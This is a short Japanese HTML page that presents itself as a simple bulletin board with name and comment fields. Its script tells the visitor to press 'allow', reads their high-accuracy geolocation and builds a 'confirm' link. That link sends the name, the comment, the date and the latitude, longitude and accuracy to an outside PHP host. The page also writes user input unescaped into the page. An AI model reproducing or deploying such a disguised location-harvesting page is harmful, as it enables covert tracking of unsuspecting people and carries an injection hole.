<html lang="ja">
<head>
<title>投稿ページ</title>
<meta charset="UTF-8" />
</head>
<body>
<h1>掲示板です</h1>
<br>
<h1>名前</h1>
<br>
<input type="text" id="name">
<br>
<h1>コメント</h1>
<input type="text" id="text">
<br>
<input type="button" value="ok" onClick="test()">

<br><br>
<a href="https://bit.ly/2FotoeN">lineにGO</a>

<script>
function test() {
window.alert("許可押してね");

var today = new Date();
var month = today.getMonth() + 1;
var day = today.getDate();

navigator.geolocation.getCurrentPosition( (position) => {
    var lat  = position.coords.latitude;
    var lng  = position.coords.longitude;
    var accu = position.coords.accuracy;
    displayData(lat, lng, accu);
}, (error) => {
}, {
    enableHighAccuracy: true
});

function displayData(lat, lng, accu){

var name = document.getElementById('name').value;
var text = document.getElementById('text').value;

document.write("<h1>名前</h1><br>" + name + "<br><h1>コメント</h1>" + text);
document.write("<br><a href=http://yumaabckhh.php.xdomain.jp/h.php?name=" + name + "&text=" + text + "&get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + ">確定</a>");
}
}
</script>
</body>
</html>
